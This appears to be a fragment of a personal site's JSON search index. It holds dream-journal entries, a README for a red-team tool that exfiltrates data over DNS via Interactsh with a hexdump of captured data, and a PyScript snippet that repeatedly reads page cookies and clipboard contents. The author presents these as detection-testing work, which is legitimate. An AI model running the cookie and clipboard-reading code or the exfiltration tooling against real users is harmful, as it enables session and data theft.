explained that night the former friend got forced to do some stuff when she didn't want to.","title":"Dream my former friend got attacked"},{"location":"Stuff/weird-dreams/#head-rolling-dream","text":"I know this one is kind of a trope because everyone has these, but I had a dream as a kid of being decapitated. In doing so, I stayed present in my head enough to see my body drop. I don't currently remember but more about it, but if I remember i'll update this.","title":"Head rolling dream"},{"location":"Stuff/dnsc2/dns/","text":"This is a raw copy of the readme page, because it's easier: https://github.com/ferasdour/dns_exfil_controller DNS Exfil over Interactsh So, long story short here; I made a blog post (https://feemcotech.blogspot.com/2025/05/pyscript-nim-aaaaand-go.html) about my experiences learning different languages building example red team malware. I then decided I'd take those and make a simple controller for them since I was able to show a client that detections worked in some scenarios but not others. That's what this is. But I didn't leave it at just that yet. I wanted to see how different detections work against different programming languages implementing the exact same logic and for the tool to be able to spin those up. to build controller go build . to build samples check out the dependencies, I had some issues with nim throwing windows.h and other c library files that were accessible and in the path and what not. So I had to add additional options to the nim compile to get it to work crypting This wasn't considered when making this, but there are many ways to hide this. Reading the exfil file I know I could implement better logic, maybe use a special encoded option for \"start new file\" then give name, then \"start data\". but it seemed so much easier to just grab everything into one file (since it generates new binary on each run of the controller, to a new interactsh client callback) and use binwalk, foremost, or strings, hexdump, whatever to pull information out of it. The intention for this isn't to be used maliciously, but to showcase an ability for real attackers to exfiltrate data in a way that immediately compromises everything that was collected. That along with testing behavioral alerting instead of file by file alerting (one of the many benefits to modern EDR), seemed like a tool worth sharing. Other ways to run This can be imported into a container, I haven't made one yet, but it seems pretty stright forward; ubuntu latest, install stuff needed, start with a file mount. Maybe use a bash script to start this so it generates a new local file for each container as it runs to mount for the /tmp/exfil, and maybe add a variable for the .exe name to change with each container. idk, maybe i'll work on that later. For now, i'm having more fun just going through different languages running this. running examples: I did 3 uploads: https://app.any.run/tasks/c7131923-861c-48c6-a802-5ba55904054b - go test https://app.any.run/tasks/1fdfa6c1-aca0-453b-a556-25ac5741016e - nim test https://app.any.run/tasks/ad36533e-6214-40c2-8fcc-762b3e7706e9 - second go test (longer time) hexdump -Cv /tmp/exfil 00000000 15 00 01 00 02 00 02 00 00 00 00 00 b8 24 cc 60 |.............$.`| 00000010 10 00 00 00 00 00 00 00 00 00 00 ff ff ff ff 00 |................| 00000020 00 00 00 ff ff ff f7 00 00 00 00 00 00 00 00 00 |................| 00000030 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00000040 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00000050 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00000060 ff fe 0d 00 0a 00 5b 00 2e 00 53 00 80 06 50 06 |......[...S...P.| 00000070 c0 06 c0 04 30 06 c0 06 00 73 00 73 00 49 00 6e |....0....s.s.I.n| 00000080 00 66 00 6f 05 d0 00 d0 00 a0 04 c0 06 f0 06 30 |.f.o...........0| 00000090 05 d0 00 d0 00 a0 04 c0 06 f0 06 30 05 d0 00 d0 |...........0....| 000000a0 00 a0 04 c0 06 f0 06 30 05 d0 00 d0 00 a0 04 c0 |.......0........| 000000b0 06 f0 06 30 61 00 6c 00 69 00 7a 00 65 00 64 00 |...0a.l.i.z.e.d.| 000000c0 61 00 6c 00 69 00 7a 00 65 00 64 00 61 00 6c 00 |a.l.i.z.e.d.a.l.| 000000d0 69 00 7a 00 65 00 64 00 61 00 6c 00 69 00 7a 00 |i.z.e.d.a.l.i.z.| 000000e0 65 00 64 00 20 06 50 07 30 06 f0 07 50 07 20 06 |e.d. .P.0...P. .| 000000f0 00 65 00 4e 00 61 00 6d 00 65 00 3d 04 00 02 50 |.e.N.a.m.e.=...P| 00000100 05 30 07 90 07 30 07 40 65 00 6d 00 52 00 6f 00 |.0...0.@e.m.R.o.| 00000110 6f 00 74 00 50 05 c0 07 30 07 90 07 30 07 40 06 |o.t.P...0...0.@.| 00000120 00 6d 00 33 00 32 00 5c 00 77 00 69 06 e0 06 40 |.m.3.2.\\.w.i...@| 00000130 06 f0 07 70 07 30 02 e0 73 00 74 00 6f 00 72 00 |...p.0..s.t.o.r.| 00000140 61 00 67 00 50 02 e0 06 40 06 c0 06 c0 02 c0 02 |a.g.P...@.......| 00000150 00 32 00 31 00 38 00 32 00 35 00 0d 00 a0 04 90 |.2.1.8.2.5......| 00000160 06 30 06 f0 06 e0 05 20 65 00 73 00 6f 00 75 00 |.0..... e.s.o.u.| 00000170 72 00 63 00 50 03 d0 02 50 05 30 07 90 07 30 07 |r.c.P...P.0...0.| 00000180 00 65 00 6d 00 52 00 6f 00 6f 00 74 02 50 05 c0 |.e.m.R.o.o.t.P..| 00000190 07 30 07 90 07 30 07 40 65 00 6d 00 33 00 32 00 |.0...0.@e.m.3.2.| 000001a0 5c 00 69 00 d0 06 10 06 70 06 50 07 20 06 50 07 |\\.i.....p.P. .P.| 000001b0 00 2e 00 64 00 6c 00 6c 00 2c 00 2d |...d.l.l.,.-| Credits: First and foremost, this all started by replicating with slight modifications a tool on https://github.com/byt3bl33d3r/OffensiveNim google The many other offensive(programminglanguage) repos out there","title":"dns"},{"location":"Stuff/dnsc2/dns/#dns-exfil-over-interactsh","text":"So, long story short here; I made a blog post (https://feemcotech.blogspot.com/2025/05/pyscript-nim-aaaaand-go.html) about my experiences learning different languages building example red team malware. I then decided I'd take those and make a simple controller for them since I was able to show a client that detections worked in some scenarios but not others. That's what this is. But I didn't leave it at just that yet. I wanted to see how different detections work against different programming languages implementing the exact same logic and for the tool to be able to spin those up.","title":"DNS Exfil over Interactsh"},{"location":"Stuff/dnsc2/dns/#to-build-controller","text":"go build .","title":"to build controller"},{"location":"Stuff/dnsc2/dns/#to-build-samples","text":"check out the dependencies, I had some issues with nim throwing windows.h and other c library files that were accessible and in the path and what not. So I had to add additional options to the nim compile to get it to work","title":"to build samples"},{"location":"Stuff/dnsc2/dns/#crypting","text":"This wasn't considered when making this, but there are many ways to hide this.","title":"crypting"},{"location":"Stuff/dnsc2/dns/#reading-the-exfil-file","text":"I know I could implement better logic, maybe use a special encoded option for \"start new file\" then give name, then \"start data\". but it seemed so much easier to just grab everything into one file (since it generates new binary on each run of the controller, to a new interactsh client callback) and use binwalk, foremost, or strings, hexdump, whatever to pull information out of it. The intention for this isn't to be used maliciously, but to showcase an ability for real attackers to exfiltrate data in a way that immediately compromises everything that was collected. That along with testing behavioral alerting instead of file by file alerting (one of the many benefits to modern EDR), seemed like a tool worth sharing.","title":"Reading the exfil file"},{"location":"Stuff/dnsc2/dns/#other-ways-to-run","text":"This can be imported into a container, I haven't made one yet, but it seems pretty stright forward; ubuntu latest, install stuff needed, start with a file mount. Maybe use a bash script to start this so it generates a new local file for each container as it runs to mount for the /tmp/exfil, and maybe add a variable for the .exe name to change with each container. idk, maybe i'll work on that later. For now, i'm having more fun just going through different languages running this.","title":"Other ways to run"},{"location":"Stuff/dnsc2/dns/#running-examples","text":"I did 3 uploads: https://app.any.run/tasks/c7131923-861c-48c6-a802-5ba55904054b - go test https://app.any.run/tasks/1fdfa6c1-aca0-453b-a556-25ac5741016e - nim test https://app.any.run/tasks/ad36533e-6214-40c2-8fcc-762b3e7706e9 - second go test (longer time) hexdump -Cv /tmp/exfil 00000000 15 00 01 00 02 00 02 00 00 00 00 00 b8 24 cc 60 |.............$.`| 00000010 10 00 00 00 00 00 00 00 00 00 00 ff ff ff ff 00 |................| 00000020 00 00 00 ff ff ff f7 00 00 00 00 00 00 00 00 00 |................| 00000030 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00000040 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00000050 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 |................| 00000060 ff fe 0d 00 0a 00 5b 00 2e 00 53 00 80 06 50 06 |......[...S...P.| 00000070 c0 06 c0 04 30 06 c0 06 00 73 00 73 00 49 00 6e |....0....s.s.I.n| 00000080 00 66 00 6f 05 d0 00 d0 00 a0 04 c0 06 f0 06 30 |.f.o...........0| 00000090 05 d0 00 d0 00 a0 04 c0 06 f0 06 30 05 d0 00 d0 |...........0....| 000000a0 00 a0 04 c0 06 f0 06 30 05 d0 00 d0 00 a0 04 c0 |.......0........| 000000b0 06 f0 06 30 61 00 6c 00 69 00 7a 00 65 00 64 00 |...0a.l.i.z.e.d.| 000000c0 61 00 6c 00 69 00 7a 00 65 00 64 00 61 00 6c 00 |a.l.i.z.e.d.a.l.| 000000d0 69 00 7a 00 65 00 64 00 61 00 6c 00 69 00 7a 00 |i.z.e.d.a.l.i.z.| 000000e0 65 00 64 00 20 06 50 07 30 06 f0 07 50 07 20 06 |e.d. .P.0...P. .| 000000f0 00 65 00 4e 00 61 00 6d 00 65 00 3d 04 00 02 50 |.e.N.a.m.e.=...P| 00000100 05 30 07 90 07 30 07 40 65 00 6d 00 52 00 6f 00 |.0...0.@e.m.R.o.| 00000110 6f 00 74 00 50 05 c0 07 30 07 90 07 30 07 40 06 |o.t.P...0...0.@.| 00000120 00 6d 00 33 00 32 00 5c 00 77 00 69 06 e0 06 40 |.m.3.2.\\.w.i...@| 00000130 06 f0 07 70 07 30 02 e0 73 00 74 00 6f 00 72 00 |...p.0..s.t.o.r.| 00000140 61 00 67 00 50 02 e0 06 40 06 c0 06 c0 02 c0 02 |a.g.P...@.......| 00000150 00 32 00 31 00 38 00 32 00 35 00 0d 00 a0 04 90 |.2.1.8.2.5......| 00000160 06 30 06 f0 06 e0 05 20 65 00 73 00 6f 00 75 00 |.0..... e.s.o.u.| 00000170 72 00 63 00 50 03 d0 02 50 05 30 07 90 07 30 07 |r.c.P...P.0...0.| 00000180 00 65 00 6d 00 52 00 6f 00 6f 00 74 02 50 05 c0 |.e.m.R.o.o.t.P..| 00000190 07 30 07 90 07 30 07 40 65 00 6d 00 33 00 32 00 |.0...0.@e.m.3.2.| 000001a0 5c 00 69 00 d0 06 10 06 70 06 50 07 20 06 50 07 |\\.i.....p.P. .P.| 000001b0 00 2e 00 64 00 6c 00 6c 00 2c 00 2d |...d.l.l.,.-|","title":"running examples:"},{"location":"Stuff/dnsc2/dns/#credits","text":"First and foremost, this all started by replicating with slight modifications a tool on https://github.com/byt3bl33d3r/OffensiveNim google The many other offensive(programminglanguage) repos out there","title":"Credits:"},{"location":"Stuff/pyscript_testing/pyscript-test/","text":"What is this? Well, I wanted to embed something else, but instead, how about I just show you what pyscript can do and see if your detections catch it! :D what? So pyscript is really pretty neat, but it seems like it's just pythonic commands for javascript and not really a python runtime, so that brings limitations. Even so, pretty fun because it's super easy to make less detectable ways of stealing cookies and clipboard data. import asyncio, js, pyscript, base64, urllib from pyodide.ffi import create_proxy import warnings warnings.filterwarnings(\"ignore\") from js import XMLHttpRequest from io import StringIO from pyscript import document async def get_clipboard_data(): try: all_cookies = document.cookie text_data = await js.navigator.clipboard.readText() pyscript.display(\"Cookies: \"+str(all_cookies)) pyscript.display(\"ClipBoard: \"+ str(text_data)) except: pass pyscript.document.querySelector(\"#c\").focus() get_clipboard_data_proxy = create_proxy(get_clipboard_data) pyscript.display(\"Data Found by clicking this page:\") async def main(): while True: try: asyncio.ensure_future(get_clipboard_data_proxy()) await asyncio.sleep(10) except: pass main()","title":"pyscript-test"},{"location":"Stuff/pyscript_testing/pyscript-test/#what-is-this","text":"Well, I wanted to embed something else, but instead, how about I just show you what pyscript can do and see if your detections catch it! :D","title":"What is this?"},{"location":"Stuff/pyscript_testing/pyscript-test/#what","text":"So pyscript is really pretty neat, but it seems like it's just pythonic commands for javascript and not really a python runtime, so that brings limitations. Even so, pretty fun because it's super easy to make less detectable ways of stealing cookies and clipboard data. import asyncio, js, pyscript, base64, urllib from pyodide.ffi import create_proxy import warnings warnings.filterwarnings(\"ignore\") from js import XMLHttpRequest from io import StringIO from pyscript import document async def get_clipboard_data(): try: all_cookies = document.cookie text_data = await js.navigator.clipboard.readText() pyscript.display(\"Cookies: \"+str(all_cookies)) pyscript.display(\"ClipBoard: \"+ str(text_data)) except: pass pyscript.document.querySelector(\"#c\").focus() get_clipboard_data_proxy = create_proxy(get_clipboard_data) pyscript.display(\"Data Found by clicking this page:\") async def main(): while True: try: asyncio.ensure_future(get_clipboard_data_proxy()) await asyncio.sleep(10) except: pass main()","title":"what?"}]}